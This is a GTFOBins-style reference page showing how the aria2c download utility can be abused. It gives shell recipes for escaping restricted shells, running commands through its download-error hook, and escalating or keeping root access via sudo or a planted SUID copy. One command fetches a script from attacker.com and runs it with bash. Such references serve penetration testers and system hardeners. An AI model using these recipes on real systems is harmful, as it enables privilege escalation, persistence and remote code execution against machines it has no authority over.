# GTFOBin: aria2c

Note that the subprocess is immediately sent to the background.

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x
```

The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

```
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
aria2c -o "$LFILE" "$URL"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which aria2c) .

COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x
```